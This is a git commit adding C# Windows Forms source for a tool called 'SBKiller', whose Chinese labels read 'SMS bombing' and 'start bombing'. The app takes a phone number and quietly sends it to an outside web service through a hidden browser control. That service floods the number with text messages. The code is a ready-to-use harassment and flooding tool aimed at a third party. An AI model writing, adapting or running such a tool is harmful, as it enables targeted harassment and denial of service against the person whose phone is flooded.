be12883a13bfa6dd3a368d73dba91c32227d9f26
WiseMaterialismer <1353267372@qq.com>
2021-09-13 17:08:40 +0800

    ''

---
+++ SBKiller/SBKiller/Form1.Designer.cs
@@ -0,0 +1,142 @@
+﻿
+namespace SBKiller
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// 必需的设计器变量。
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// 清理所有正在使用的资源。
+        /// </summary>
+        /// <param name="disposing">如果应释放托管资源，为 true；否则为 false。</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows 窗体设计器生成的代码
+
+        /// <summary>
+        /// 设计器支持所需的方法 - 不要修改
+        /// 使用代码编辑器修改此方法的内容。
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.label4 = new System.Windows.Forms.Label();
+            this.webBrowser1 = new System.Windows.Forms.WebBrowser();
+            this.label6 = new System.Windows.Forms.Label();
+            this.label5 = new System.Windows.Forms.Label();
+            this.button3 = new System.Windows.Forms.Button();
+            this.textBox3 = new System.Windows.Forms.TextBox();
+            this.panel2 = new System.Windows.Forms.Panel();
+            this.panel2.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Location = new System.Drawing.Point(10, 9);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(53, 12);
+            this.label4.TabIndex = 7;
+            this.label4.Text = "短信轰炸";
+            // 
+            // webBrowser1
+            // 
+            this.webBrowser1.Location = new System.Drawing.Point(135, 3);
+            this.webBrowser1.MinimumSize = new System.Drawing.Size(20, 20);
+            this.webBrowser1.Name = "webBrowser1";
+            this.webBrowser1.ScriptErrorsSuppressed = true;
+            this.webBrowser1.Size = new System.Drawing.Size(141, 20);
+            this.webBrowser1.TabIndex = 8;
+            this.webBrowser1.Visible = false;
+            // 
+            // label6
+            // 
+            this.label6.AutoSize = true;
+            this.label6.ForeColor = System.Drawing.Color.Red;
+            this.label6.Location = new System.Drawing.Point(10, 193);
+            this.label6.Name = "label6";
+            this.label6.Size = new System.Drawing.Size(0, 12);
+            this.label6.TabIndex = 11;
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.Location = new System.Drawing.Point(4, 15);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(53, 12);
+            this.label5.TabIndex = 1;
+            this.label5.Text = "手机号：";
+            // 
+            // button3
+            // 
+            this.button3.Location = new System.Drawing.Point(246, 12);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(142, 23);
+            this.button3.TabIndex = 2;
+            this.button3.Text = "开始轰炸";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.button3_Click);
+            // 
+            // textBox3
+            // 
+            this.textBox3.Location = new System.Drawing.Point(62, 12);
+            this.textBox3.Name = "textBox3";
+            this.textBox3.Size = new System.Drawing.Size(178, 21);
+            this.textBox3.TabIndex = 3;
+            this.textBox3.KeyDown += new System.Windows.Forms.KeyEventHandler(this.textBox3_KeyDown_1);
+            // 
+            // panel2
+            // 
+            this.panel2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.panel2.Controls.Add(this.textBox3);
+            this.panel2.Controls.Add(this.button3);
+            this.panel2.Controls.Add(this.label5);
+            this.panel2.Location = new System.Drawing.Point(12, 29);
+            this.panel2.Name = "panel2";
+            this.panel2.Size = new System.Drawing.Size(396, 47);
+            this.panel2.TabIndex = 6;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(409, 77);
+            this.Controls.Add(this.label6);
+            this.Controls.Add(this.webBrowser1);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.panel2);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.Fixed3D;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximizeBox = false;
+            this.Name = "Form1";
+            this.Tag = "";
+            this.Text = "SBKiller";
+            this.panel2.ResumeLayout(false);
+            this.panel2.PerformLayout();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.WebBrowser webBrowser1;
+        private System.Windows.Forms.Label label6;
+        private System.Windows.Forms.Label label5;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.TextBox textBox3;
+        private System.Windows.Forms.Panel panel2;
+    }
+}
+
---
+++ SBKiller/SBKiller/Form1.cs
@@ -0,0 +1,63 @@
+﻿using System;
+using System.Text;
+using System.Windows.Forms;
+
+namespace SBKiller
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+        private void button3_Click(object sender, EventArgs e)
+        {
+            string phone = textBox3.Text;
+            bool isNumber = IsNumber(phone);
+            if (button3.Text == @"开始轰炸")
+            {
+                if (isNumber == false && phone.Length != 11 )
+                {
+                    MessageBox.Show(@"W请输入正确的手机号！", @"提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                }
+                else
+                {
+                    webBrowser1.Navigate(string.Format("http://hz.o3f.cc/index.php?hm={0}&ok=",phone));
+                    button3.Text = @"停止轰炸";
+                    textBox3.ReadOnly = true;
+                    MessageBox.Show(@"正在对" + phone + @"进行轰炸！", @"提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                }
+            }
+            else
+            {
+                webBrowser1.Navigate("");
+                textBox3.ReadOnly = false;
+                button3.Text = @"开始轰炸";
+            }
+        }
+        public static bool IsNumber(string str)
+        {
+            if (str == null || str.Length == 0)
+                return false;
+            ASCIIEncoding ascii = new ASCIIEncoding();
+            byte[] bytestr = ascii.GetBytes(str);
+
+            foreach (byte c in bytestr)
+            {
+                if (c < 48 || c > 57)
+                {
+                    return false;
+                }
+            }
+            return true;
+        }
+
+        private void textBox3_KeyDown_1(object sender, KeyEventArgs e)
+        {
+            if (e.KeyCode == Keys.Enter)
+            {
+                button3_Click(sender, e);
+            }
+        }
+    }
+}
